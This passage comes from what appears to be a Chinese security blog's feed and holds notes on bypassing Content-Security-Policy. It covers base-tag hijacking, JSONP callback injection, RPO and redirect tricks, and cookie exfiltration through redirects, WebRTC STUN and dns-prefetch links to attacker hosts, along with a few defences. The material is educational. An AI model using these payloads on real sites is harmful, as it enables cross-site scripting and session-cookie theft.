class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src https://unpkg.com/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/react@16.7.0/umd/react.production.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span> <span class="attr">csp</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="通过base标签绕过"><a href="#通过base标签绕过" class="headerlink" title="通过base标签绕过"></a>通过base标签绕过</h1><p>假设加上了nonce，且无法被猜测<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;; script-src &#x27;nonce-abc123&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xss --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://attacker.com/my.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">abc123</span> <span class="attr">src</span>=<span class="string">&quot;app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这样就会无法加载<code>my.js</code><br>但是如果用下面的代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;; script-src &#x27;nonce-abc123&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xss --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;https://attacker.com/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">abc123</span> <span class="attr">src</span>=<span class="string">&quot;app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>通过改变base，然后去加载攻击者的<code>app.js</code><br>修复方法就是用上一章里面有的<code>base-uri &#39;none&#39;</code></p><h1 id="JSONP绕过"><a href="#JSONP绕过" class="headerlink" title="JSONP绕过"></a>JSONP绕过</h1><h2 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h2><p>因为同源策略，如果想向其他网站取出数据，通过下面的代码是无法取出数据的<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://example.com/&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> <span class="title function_">btoa</span>(data))</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> location.<span class="title function_">replace</span>(<span class="string">`http://ATTACKER/?data=<span class="subst">$&#123;data&#125;</span>`</span>))</span><br></pre></td></tr></table></figure><br><img src="/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A86-CSP%E7%BB%95%E8%BF%87%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>会爆出上面的错误，但是加载别人的js代码是没问题的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line"><span class="comment">//获取回调函数名</span></span><br><span class="line"><span class="variable">$jsoncallback</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_REQUEST</span> [<span class="string">&#x27;jsoncallback&#x27;</span>]);</span><br><span class="line"><span class="comment">//json数据</span></span><br><span class="line"><span class="variable">$json_data</span> = <span class="string">&#x27;[&quot;customername1&quot;,&quot;customername2&quot;]&#x27;</span>;</span><br><span class="line"><span class="comment">//输出jsonp格式的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$jsoncallback</span> . <span class="string">&quot;(&quot;</span> . <span class="variable">$json_data</span> . <span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>别人调用一个函数，函数名是你自己的请求的，然后你这边把函数设计一下就行了<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP 实例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;divCustomers&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">callbackFunction</span>(<span class="params">result, methodName</span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> html = <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; result.<span class="property">length</span>; i++)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        html += <span class="string">&#x27;&lt;li&gt;&#x27;</span> + result[i] + <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    html += <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;divCustomers&#x27;</span>).<span class="property">innerHTML</span> = html;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>这段代码是我从runoob抄下来的，他加了个htmlspecialchars，但是并没有什么卵用，直接绕<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=alert(1);callbackFunction&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>有一个仓库收集了一些jsonp，可以被绕过<br><a href="https://github.com/zigoo0/JSONBee">https://github.com/zigoo0/JSONBee</a></p><p>所以真正的过滤应该是，只允许<code>a-zA-Z.</code>这些字符<br>但是这样其实也有办法可以绕过<br><a href="https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/">https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/</a><br>参考这个文章，如果某个按钮出现了问题，你可以通过获取他的元素，然后click()<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>点击弹窗<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">firstElementChild</span>.<span class="title function_">click</span>()</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>如果是个jsonp，那么就是<br><a href="https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=document.body.firstElementChild.click">https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=document.body.firstElementChild.click</a></p><h1 id="重定向绕过"><a href="#重定向绕过" class="headerlink" title="重定向绕过"></a>重定向绕过</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src http://localhost https://192.168.3.16/a/b/c/d&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://192.168.3.16/test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://192.168.3.16/a/test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost/301.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>301.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://192.168.3.16/test.js&#x27;</span>);</span><br></pre></td></tr></table></figure><br>前两个因为csp策略被阻拦了，最后一个是一个允许的，并且是个重定向，但是只能重定向到csp规定的host，他只是不在看path了，但是host还是看的，如果是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://abc.com/test.js&#x27;</span>);</span><br></pre></td></tr></table></figure><br>还是会被拦截</p><h1 id="RPO绕过"><a href="#RPO绕过" class="headerlink" title="RPO绕过"></a>RPO绕过</h1><p>如果CSP是允许<code>https://example.com/script/abc/</code><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src http://127.0.0.1/script/abc/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;pragma&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;no-cache&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;Cache-Control&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;no-cache, must-revalidate&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;expires&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/script/abc/..%2f..%2ftest.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>那么上面的代码就可以绕过，但是这是要取决于后端服务器的处理，nginx和nodejs是可以的，其他没测试过，到时候可以看看</p><h1 id="通源类型的绕过"><a href="#通源类型的绕过" class="headerlink" title="通源类型的绕过"></a>通源类型的绕过</h1><p>如果要获取<code>http://127.0.0.1/ycb.php</code>中的内容，但是<code>ycb.php</code>有csp保护，如下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- A页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>flag&#123;0xffff&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这时候该网站的另一个页面存在xss，并且没有CSP的保护（或者可以绕过），就可以通过很多方法去获得这个flag</p><ol><li><p>iframe</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">iframe.<span class="property">src</span>=<span class="string">&quot;http://127.0.0.1/ycb.php&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="title function_">alert</span>(iframe.<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>).<span class="property">innerHTML</span>),<span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>fetch</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1/ycb.php&#x27;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>)=&gt;</span><span class="title function_">alert</span>(data))</span><br></pre></td></tr></table></figure></li><li><p>window.open</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ycb = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://127.0.0.1/ycb.php&#x27;</span>)</span><br><span class="line">ycb.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(ycb.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>).<span class="property">innerText</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h1 id="其他种类的绕过"><a href="#其他种类的绕过" class="headerlink" title="其他种类的绕过"></a>其他种类的绕过</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;; script-src &#x27;unsafe-inline&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// any JavaScript code</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为<code>default-src &#39;none&#39;</code>的原因，<code>connect-src</code>也被设为了<code>&#39;none&#39;</code>，这时候就没法使用fetch了，那么还有什么办法</p><ol><li><p>跳转</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;https://127.0.0.1/?q=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span> <span class="comment">//这种是在当前页面跳转</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://127.0.0.1/?q=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>) <span class="comment">// 这种需要被攻击者确认弹窗，在UI模式下，headless不清楚</span></span><br></pre></td></tr></table></figure></li><li><p>WebRTC<br>通过dns来获取数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">RTCPeerConnection</span>(&#123;</span><br><span class="line">    <span class="attr">iceServers</span>: [&#123;</span><br><span class="line">        <span class="attr">urls</span>: <span class="string">&quot;stun:&quot;</span> + <span class="string">&quot;7a04c2947c.ipv6.1433.eu.org:1337&quot;</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;);</span><br><span class="line">p.<span class="title function_">createDataChannel</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">p.<span class="title function_">setLocalDescription</span>()</span><br></pre></td></tr></table></figure></li><li><p>DNS prefetch<br>为了让加载速度更快，浏览器可以提前去解析一些标签的host为ip，但是只限于老版本的浏览器，现在新的已经不行了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sessionid = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]+<span class="string">&quot;.&quot;</span>; </span><br><span class="line"><span class="keyword">var</span> body = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">body.<span class="property">innerHTML</span> = body.<span class="property">innerHTML</span> + <span class="string">&quot;&lt;link rel=\&quot;dns-prefetch\&quot; href=\&quot;//&quot;</span> + sessionid + <span class="string">&quot;attacker.ch\&quot;&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- firefox --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;dns-prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;//$&#123;cookie&#125;.vps_ip&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- chrome --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;//vps_ip?$&#123;cookie&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以加上这个header用来防御<br><code>X-DNS-Prefetch-Control: off</code></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;绕过csp的一些方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10316449&quot;&gt;https://ithelp.ithome.com.tw/articles/10316449&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>刷题1</title>
